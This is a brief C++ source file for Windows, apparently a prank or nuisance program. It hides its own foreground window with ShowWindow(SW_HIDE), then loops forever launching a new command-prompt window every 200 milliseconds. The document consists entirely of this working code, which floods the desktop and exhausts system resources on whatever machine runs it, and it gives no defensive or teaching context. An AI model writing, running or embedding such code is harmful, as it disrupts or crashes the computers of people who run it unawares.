#include<windows.h>
using namespace std;
void hide(){
	HWND hwnd=GetForegroundWindow();
	ShowWindow(hwnd,SW_HIDE);
}
int main(){
	hide();
	while(1){
		system("start cmd");
		Sleep(200);
	}
	return 0;
}
